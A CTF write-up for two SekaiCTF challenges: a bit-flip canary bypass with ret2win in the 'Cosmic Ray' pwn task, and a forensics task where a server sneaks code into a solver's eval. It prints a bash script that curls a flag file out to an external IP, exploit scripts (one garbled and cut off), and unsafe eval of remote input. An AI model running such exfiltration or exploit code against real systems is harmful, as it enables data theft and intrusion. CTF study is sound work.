SekaiCTF was an intermediate-level 48-hour CTF hosted by the team Project Sekai, and contained a lot of interesting challenges. The following challenge-writeups are for two of the challenges I solved during the competition.

# Pwn
## Cosmic Ray
This challenge was released about half-way through the CTF and ended up with 149 solves in total.

![Challenge](cosmic_ray_chall.png)

The provided zip-file contains a challenge binary, the ld and the libc. The binary have canaries and NX enabled, but PIE has been disabled
```console
$ pwn checksec ./cosmicray
[*] '/home/loevland/ctf/sekai/pwn/cosmic_ray/dist/cosmicray'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  b'.'
```

When running the binary we are given an arbitrary write with a twist; We are only able to flip a single bit position of the memory address we provide. After the bitflip (if we supply a valid memory address) we are prompted for some input
```console
$ ./cosmicray
Welcome to my revolutionary new cosmic ray machine!
Give me any address in memory and I'll send a cosmic ray through it:
0x3ff000

|0|1|2|3|4|5|6|7|
-----------------
|0|1|1|1|1|1|1|1|

Enter a bit position to flip (0-7):
0

Bit succesfully flipped! New value is -1

Decompiling the binary reveals the following main function

![Decompiled](cosmic_ray_decompiled.png)

The supplied emory address is passed to the `cosmic_ray` function. Further decompilation of this function is not required to solve the challenge, as all it does is actually flipping a single bit of what is stored at the memory address we supply.

After the bit flipping `gets` is being called, which allows us to overflow the `v5` buffer and overwrite the `rip` register. The binary comes with a `win` function which is not being called from anywhere

![Win](cosmic_ray_win.png)

The only thing preventing us to do a standard *ret2win* by overflowing the buffer and pass `win` into the `rip` register is the stack canary. At the end of the main function the value of the canary on the stack is checked to see if it has changed or not. If the value has changed (which happens when we overflow the buffer with the help of the `gets` function) the program will exit, but if it has not changed the program will not exit and continue executing until its done.

If we look at the assembly-instructions of this canary-check we see that there is a conditional jump instruction, `je`, which makes the program jump past `__stack_chk_fail@plt` (which is the function which exits our program as it detects our overflow) only when the stack canary is equal to its original value.

![Stack_check](cosmic_ray_stack_check.png)

With the help of the bit flip we are given we can change the `je` instruction to another jump instruction that will not call `__stack_chk_fail@plt` when the stack canary has been overwritten(e.g. `jne` or `jbe`). We will then be able to perform our buffer overflow since the program will not exit prematurely because of our canary overwrite.


Looking at the [opcodes](http://unixwiz.net/techtips/x86-jumps.html) we see that `je` has the value 0x74, and `jbe` has the value 0x76

![Opcodes](cosmic_ray_opcodes.png)

To change the `je` instruction to the `jbe` instruction we have to flip the 6th bit.

Knowing that we don't need to worry about the canary anymore we can use *ret2win* to solve the rest of the challenge.

This is the final solve-script for the challenge
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './cosmicray', checksec=False)
host = args.HOST or 'chals.sekai.team'
port = int(args.PORT or 4077)

    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)

# Forensics
## Eval Me
This challenge ended up with 303 solves in total during the CTF.

![Challenge](eval_me_chall.png)

We are given a `pcap` and a netcat port and address which we can connect to. The `pcap` contains recorded network packets which we should investigate with *wireshark*.

Looking through the recorded packets we see a lot of different protocols being used (TLSv1.3, HTTP, DNS, TCP). The most interesting packets come from the HTTP protocol, as there seems to be some sort of communication in JSON between a client and a server.

![Http](eval_me_http_packets.png)

All the http-packets have this structure, with the client sending a POST request with curl to the server with some varying value for the JSON `data` field, and the server then responding with a `ok:true` for each request.

The values sent from the client in the `data` field seem like jibberish, but looks interesting enough that we keep the values for later in case we uncover something more in this challenge. We can apply a filter to only get http-packets of length 215 to get all the packets sent by the client(either by parsing the values with *tshark*, manually, or other preferable methods).

As we don't find anything more particulary interesting in the pcap it is worth investigating the server address and port we are given.

![Netcat](eval_me_netcat.png)

As the challenge is called `eval_me`, we should probably use the python function `eval` for this challenge to solve all the math problems. What could possibly go wrong by blindly calling `eval`...

I wrote this little python script to solve the math problems. The script also prints the received math-equations, as this challenge smells a bit fishy...

```python
from pwn import *

io = remote("chals.sekai.team", 9000)

io.recvuntil(b":)")
io.recvline()
io.recvline()
calc = io.recvline().strip()

io.sendline(str(eval(calc)).encode())

for i in range(99):
    io.recvuntil(b"correct\n")
    calc = io.recvline().strip()
    print(calc)
    io.sendline(str(eval(calc)).encode())
```
{: file=math.py }

When running the script we see what was sort of expected

![Eval](eval_me_evil.png)

In the middle of the equation solving there is some code passed to our `eval` function, which makes our script execute the python code, which in this case fetches, runs, and deletes a bash-script from `https://shorturl.at/fgjvU`. Manually fetching the script, called `extract.sh`, from the url we see the following code
```bash
#!/bin/bash

FLAG=$(cat flag.txt)
KEY='s3k@1_v3ry_w0w'

Asc() { printf '%d' "'$1"; }
XOREncrypt(){
    local key="$1" DataIn="$2"
    local ptr DataOut val1 val2 val3
    for (( ptr=0; ptr < ${#DataIn}; ptr++ )); do
        val1=$( Asc "${DataIn:$ptr:1}" )
        val2=$( Asc "${key:$(( ptr % ${#key} )):1}" )
        val3=$(( val1 ^ val2 ))
        DataOut+=$(printf '%02x' "$val3")
    done

    for ((i=0;i<${#DataOut};i+=2)); do
    BYTE=${DataOut:$i:2}
    curl -m 0.5 -X POST -H "Content-Type: application/json" -d "{\"data\":\"$BYTE\"}" http://35.196.65.151:30899/ &>/dev/null
    done
}
XOREncrypt $KEY $FLAG
exit 0
```
{: file=extract.sh }

One of the last commands, `curl -m 0.5 -X POST -H "Content-Type: application/json" -d "{\"data\":\"$BYTE\"}" http://35.196.65.151:30899/ &>/dev/null`, can be recognized from the `pcap` we analyzed earlier. This command is what created the requests we extracted. The script reads the flag from *flag.txt* and xor it with the key `s3k@1_v3ry_w0w`. This means that the values we extracted earlier could be the encrypted flag!

We attempt to decrypt the encrypted flag with python
```python
enc_flag = "20762001782445454615001000284b41193243004e41000b2d0542052c0b1932432d0441000b2d05422852124a1f096b4e000f" # Extracted from pcap
key = "s3k@1_v3ry_w0w" # Key from extract.sh

for idx, enc_char in enumerate([int(enc_flag[i:i+2], 16) for i in range(0, len(enc_flag), 2)]): # Split enc_flag in pairs of 2
    print(chr(enc_char ^ ord(key[idx % len(key)])), end="") # Xor key and enc_flag byte by byte
```

```console
$ python3 decrypt.py
